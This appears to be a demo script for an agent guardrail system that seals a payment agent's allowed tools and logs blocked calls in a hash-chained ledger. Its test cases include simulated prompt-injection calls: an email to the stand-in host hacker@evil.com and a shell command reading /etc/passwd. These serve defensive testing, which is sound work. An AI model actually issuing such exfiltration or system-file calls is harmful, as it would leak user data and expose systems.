"""
demo.py — End-to-end proof that Agent Integrity Engine works.

Simulates a TransactionAgent being called with:
  1. A legitimate tool call        → ALLOWED  ✓
  2. A forbidden tool call         → BLOCKED  ✗
  3. A prompt-injection attempt    → BLOCKED  ✗
  4. A valid tool with bad payload → BLOCKED  ✗

Then prints the tamper-proof execution ledger.
"""

import sys
import os
sys.path.insert(0, os.path.dirname(__file__))

import jsonschema
from schema.intent_contract import IntentContract
from schema.tool_gate import ToolAuthorityGate, ToolAuthorizationError
from schema.execution_ledger import ExecutionLedger
from schema.control_flow import ControlFlowIntegrity, ControlFlowViolation
from schema.intent_seal import IntentSeal, HashIntentContract
from policy.policy_loader import PolicyLoader

# ── 1. Load policy from YAML ──────────────────────────────────────────────────
policy = PolicyLoader.load("policy/guardrails.yaml")
print(f"\nLoaded policy for agent: {policy['agent']}")
print(f"   Allowed : {policy['allowed_tools']}")
print(f"   Forbidden: {policy['forbidden_tools']}")

# ── 2. Seal the intent ────────────────────────────────────────────────────────
raw_intent = HashIntentContract(
    agent_name=policy["agent"],
    user_task="Process payment of $200 to Alice",
    allowed_tools=policy["allowed_tools"],
    forbidden_tools=policy["forbidden_tools"],
)

sealer = IntentSeal()
sealed = sealer.seal_intent(raw_intent)
print(f"\n🔐 Intent sealed | hash={sealed.hash[:24]}...")

assert sealer.verify_seal(sealed), "Seal verification failed!"
print("okkk Seal verified — contract is immutable for this session\n")

# ── 3. Build the gate + ledger ────────────────────────────────────────────────
contract = IntentContract(
    agent_name=sealed.agent_name,
    user_task=sealed.user_task,
    allowed_tools=sealed.allowed_tools,
    forbidden_tools=sealed.forbidden_tools,
)
intent_hash = contract.intent_hash()

gate = ToolAuthorityGate(contract)
ledger = ExecutionLedger()
flow = ControlFlowIntegrity(allowed_sequence=["proceed_transaction"])

# ── 4. Simulate tool calls ────────────────────────────────────────────────────
def simulate_tool_call(tool_name: str, payload: dict, label: str):
    print(f"{'─'*60}")
    print(f"Agent attempts: {label}")
    print(f"   tool={tool_name}  payload={payload}")
    try:
        gate.authorize(tool_name, payload)
        flow.validate_step(tool_name)
        ledger.add_entry(intent_hash, tool_name, "ALLOWED", "Passed all checks")
        print(f"   okkk ALLOWED")
    except ToolAuthorizationError as e:
        ledger.add_entry(intent_hash, tool_name, "BLOCKED", str(e))
        print(f"   Nopee BLOCKED — {e}")
    except ControlFlowViolation as e:
        ledger.add_entry(intent_hash, tool_name, "BLOCKED", str(e))
        print(f"   Nopee FLOW VIOLATION — {e}")
    except jsonschema.ValidationError as e:
        ledger.add_entry(intent_hash, tool_name, "BLOCKED", e.message)
        print(f"   Nopee SCHEMA ERROR — {e.message}")


# Test 1: Legitimate call
simulate_tool_call(
    "proceed_transaction",
    {"amount": 200, "recipient": "Alice"},
    "Legitimate payment"
)

# Test 2: Forbidden tool — direct attempt
simulate_tool_call(
    "send_email",
    {"to": "hacker@evil.com", "body": "Here is the receipt"},
    "Prompt injection — email exfiltration"
)

# Test 3: Tool not in allowed list at all
simulate_tool_call(
    "shell_exec",
    {"cmd": "cat /etc/passwd"},
    "Prompt injection — shell access"
)

# Test 4: Allowed tool but malformed payload
simulate_tool_call(
    "proceed_transaction",
    {"amount": "not-a-number", "recipient": "Bob"},
    "Valid tool, invalid payload (amount is a string)"
)

print("EXECUTION LEDGER (tamper-proof chain)")
print(f"{'═'*60}")
for i, entry in enumerate(ledger.ledge):
    icon = "okkk" if entry["status"] == "ALLOWED" else "Nopee"
    print(f"\n[{i}] {icon} {entry['status']}")
    print(f"    tool      : {entry['tool']}")
    print(f"    reason    : {entry['reason']}")
    print(f"    timestamp : {entry['timestamp']}")
    print(f"    prev_hash : {entry['previous_hash'][:24]}...")
    print(f"    entry_hash: {entry['entry_hash'][:24]}...")

print(f"\n{'═'*60}")
chain_ok = ledger.verify_chain()
print(f"Chain integrity: {'VALID ✓' if chain_ok else 'TAMPERED ✗'}")
violations = ledger.get_violations()
print(f"Violations logged: {len(violations)}")
print(f"{'═'*60}\n")